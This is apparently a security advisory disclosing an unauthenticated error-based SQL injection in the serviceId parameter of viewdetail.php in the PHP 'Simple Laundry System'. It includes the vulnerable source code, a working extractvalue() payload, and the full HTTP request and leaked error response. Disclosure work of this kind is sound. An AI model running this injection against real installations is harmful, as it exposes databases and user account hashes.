## SIMPLE_LAUNDRY_SYSTEM viewdetail.php Error-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `serviceId` parameter of `viewdetail.php` is concatenated directly into the service history query, and the script writes the raw MySQL error message to the page whenever that query fails. An attacker can therefore place any subquery inside `extractvalue()` and have its result returned in the HTTP response, which turns an ordinary GET request into a channel for dumping the database name, the table list and the account hashes held in the `member` and `staff` tables. The script does not check the session at all, so the injection works without any credentials.

### II. Source Code Analysis

The vulnerability resides in `viewdetail.php`, lines 4 and 57-60:

```php
$serviceId = $_GET['serviceId'];
...
$q="SELECT *,firstName,lastName,itemName FROM `regisitem`,`member`,`item` where  `serviceId` = '$serviceId' AND regisitem.memberId = member.memberId AND regisitem.itemId = item.itemId ORDER BY `serviceId`";
$result=$mysqli->query($q);
if(!$result){
    echo "Select failed. Error: ".$mysqli->error ;
    // break;
}
while($row=$result->fetch_array()){
```

`$serviceId` comes straight from `$_GET` with no `intval()`, no `mysqli_real_escape_string()` and no prepared statement, and it is placed between the quotes of `serviceId = '$serviceId'`. A single quote in the parameter therefore terminates the literal and the characters that follow are compiled as SQL.

The error branch on lines 59-62 is what makes the flaw directly exploitable instead of merely blind: `echo "Select failed. Error: ".$mysqli->error ;` copies the MySQL error text into the HTML body. Any function that fails while reporting the value of its argument — `extractvalue()` and `updatexml()` being the usual ones — lets the attacker read the result of an arbitrary expression straight from the page. The branch contains no `break` and no `exit`, so control falls through to line 63 where `$result->fetch_array()` is called on the boolean `false` and raises a fatal error, which is also visible in the response.

The file starts with `session_start()` but never inspects `$_SESSION`, so nothing prevents an unauthenticated request from reaching line 57.

### III. Payload

The core injection payload is:

```
1'and/**/extractvalue(1,concat(char(126),md5(1755793703)))and'
```

The resulting SQL statement executed by the server becomes:

```sql
SELECT *,firstName,lastName,itemName FROM `regisitem`,`member`,`item` where  `serviceId` = '1'and/**/extractvalue(1,concat(char(126),md5(1755793703)))and'' AND regisitem.memberId = member.memberId AND regisitem.itemId = item.itemId ORDER BY `serviceId`
```

The leading `1'` closes the `serviceId` literal, `/**/` replaces the spaces so that the payload survives URL parsing unchanged, `extractvalue()` is handed a malformed XPath made of `char(126)` (`~`) followed by the expression to be read, and the trailing `and'` restores the quote that the PHP template appends. MySQL evaluates the argument, then rejects the XPath and repeats it inside the error message, so the value — the MD5 of `1755793703` here — is delivered to the client.

```
GET /viewdetail.php?serviceId=1'and/**/extractvalue(1,concat(char(126),md5(1755793703)))and' HTTP/1.1
Host: bbn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/viewhistory.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive
```

The response carries the evaluated expression inside the MySQL error message, which proves that the injected SQL ran and that arbitrary query results can be read from the page:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:15:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1606

<!DOCTYPE html>
<html>
<head>
<title>Database project</title>
<link rel="stylesheet" type="text/css" href="stylesbackup1.css">
...
<tr>
<th>Service ID</th>
<th>Staff ID</th>
<th>Member Id</th>
<th>Member Name</th>
<th>Item Name</th>
<th>Quantity</th>
</tr>
Select failed. Error: XPATH syntax error: '~8b0c8b7cae17eccadd70894ce1800c1'<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_array() on bool in E:\phpstudy_pro\WWW\bbn\viewdetail.php:63
Stack trace:
#0 {main}
thrown in <b>E:\phpstudy_pro\WWW\bbn\viewdetail.php</b> on line <b>63</b><br />
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030171925044](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030171925044.png)

